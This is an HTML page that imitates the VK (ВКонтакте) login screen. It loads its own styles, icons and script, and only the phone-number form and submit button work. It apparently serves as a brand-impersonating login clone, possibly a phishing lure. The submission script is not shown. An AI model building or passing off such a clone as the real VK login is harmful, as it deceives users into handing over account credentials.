<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход ВКонтакте</title>
    <link rel="stylesheet" href="/styles.css">
    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet">
</head>
<body class="vk-bg">
    <div class="vk-bg-lines"></div>
    <div class="vk-center">
        <div class="vk-card">
            <div class="vk-login-box">
                <button class="vk-back-btn" tabindex="-1"><span>&larr;</span></button>
                <div class="vk-logo-center">
                    <img src="/icons/vk.svg" alt="VK" class="vk-logo-img" onerror="this.outerHTML='<svg class=\'vk-logo-img\' width=\'48\' height=\'48\' viewBox=\'0 0 48 48\'><circle cx=24 cy=24 r=24 fill=\'#2787f5\'/><text x=24 y=32 text-anchor=\'middle\' font-size=\'24\' fill=\'white\' font-family=\'Arial,Segoe UI,sans-serif\'>vk</text></svg>'" />
                </div>
                <h2 class="vk-title">Вход ВКонтакте</h2>
                <div class="vk-tabs">
                    <button class="vk-tab active">Телефон</button>
                    <button class="vk-tab" disabled>Почта</button>
                </div>
                <form id="loginForm">
                    <div class="vk-phone-group">
                        <img src="/icons/ru.svg" alt="RU" class="vk-flag-img" onerror="this.outerHTML='<svg class=\'vk-flag-img\' width=\'24\' height=\'24\' viewBox=\'0 0 24 24\'><rect width=24 height=24 fill=\'#fff\'/><rect y=8 width=24 height=8 fill=\'#0039a6\'/><rect y=16 width=24 height=8 fill=\'#d52b1e\'/></svg>'" />
                        <input type="tel" id="phoneNumber" placeholder="+7" required autocomplete="off" />
                    </div>
                    <div class="vk-checkbox-group">
                        <input type="checkbox" id="rememberMe" checked />
                        <label for="rememberMe">Сохранить вход</label>
                    </div>
                    <button type="submit" class="vk-login-btn">Войти</button>
                </form>
                <button class="vk-create-btn" tabindex="-1">Создать аккаунт</button>
                <div class="vk-or">или с помощью</div>
                <button class="vk-qr-btn" tabindex="-1">
                    <img src="/icons/qr.svg" alt="QR" class="vk-qr-icon-img" onerror="this.outerHTML='<svg class=\'vk-qr-icon-img\' width=\'20\' height=\'20\' viewBox=\'0 0 20 20\'><rect x=2 y=2 width=6 height=6 fill=\'none\' stroke=\'#888\' stroke-width=2/><rect x=12 y=2 width=6 height=6 fill=\'none\' stroke=\'#888\' stroke-width=2/><rect x=2 y=12 width=6 height=6 fill=\'none\' stroke=\'#888\' stroke-width=2/><rect x=12 y=12 width=6 height=6 fill=\'none\' stroke=\'#888\' stroke-width=2/><rect x=8 y=8 width=4 height=4 fill=\'#888\'/></svg>'" /> QR-код
                </button>
                <div class="vk-agreement">
                    Нажимая «Войти», вы принимаете <a href="#" tabindex="-1">пользовательское соглашение</a> и <a href="#" tabindex="-1">политику конфиденциальности</a>
                </div>
            </div>
        </div>
    </div>
    <div class="vk-bottom-link">
        <a href="#" tabindex="-1">Узнать больше о VK ID</a>
    </div>
    <script src="/script.js"></script>
</body>
</html>
